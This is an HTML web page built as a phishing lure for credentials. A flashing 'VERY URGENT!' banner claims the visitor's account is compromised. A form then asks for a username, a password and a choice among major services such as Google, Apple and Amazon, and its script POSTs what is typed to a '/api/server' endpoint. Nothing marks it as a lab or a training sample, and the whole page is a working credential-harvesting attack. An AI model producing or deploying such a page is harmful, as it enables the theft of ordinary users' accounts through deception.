<!DOCTYPE html>
<html>
    <head>
        <title>give me ur login</title>
        <style>
            * {
                font-family: monospace;
            }
            body {
              background: #bfbfbf;
            }
            .warning {
              animation: warning .2s infinite linear;
            }
            @keyframes warning {
              0% {color: yellow;}
              50% {color: orange;}
              75% {color: red;}
              100% {color: yellow;}
            }
        </style>
    </head>
    <body>
      <h1 class="warning">VERY URGENT!</h1>
      <h3>Your account has been compromised! Please enter credentials to secure your account!</h3>
        <form id="form">
            <input type="text" id="username" placeholder="Username or Email" />
            <input type="text" id="password" placeholder="Password" />
            <select id="service" name="Choose Service.">
              <option value="amazon">Amazon</option>
              <option value="google">Google</option>
              <option value="apple">Apple</option>
              <option value="microsoft">Microsoft</option>
              <option value="meta">Meta (Facebook)</option>
              <option value="netflix">Netflix</option>
              <option value="youtube">YouTube</option>
              <option value="spotify">Spotify</option>
              <option value="instagram">Instagram</option>
              <option value="discord">Discord</option>
              <option value="x">X (Twitter)</option>
              <option value="tiktok">TikTok</option>
              <option value="reddit">Reddit</option>
              <option value="snapchat">Snapchat</option>
              <option value="linkedin">LinkedIn</option>
              <option value="walmart">Walmart</option>
              <option value="target">Target</option>
              <option value="costco">Costco</option>
              <option value="nike">Nike</option>
              <option value="adidas">Adidas</option>
              <option value="samsung">Samsung</option>
            </select>

            <button type="submit">Send</button>
        </form>

        <script>
            const form = document.getElementById('form');
            
            form.addEventListener('submit', async (e) => {
              e.preventDefault();
              const username = document.getElementById('username').value.trim();
              const password = document.getElementById('password').value.trim();
              const service = document.getElementById('service').value.trim();
              if (!username || !password) {
                alert('Please enter password AND username.');
                return;
              }
            
              try {
                const res = await fetch('/api/server', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ content: `${username}, ${password}, Service: ${service}` })
                });
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';
              } catch (err) {
                console.error('Error:', err);
              }
            });
        </script>
    </body>
</html>
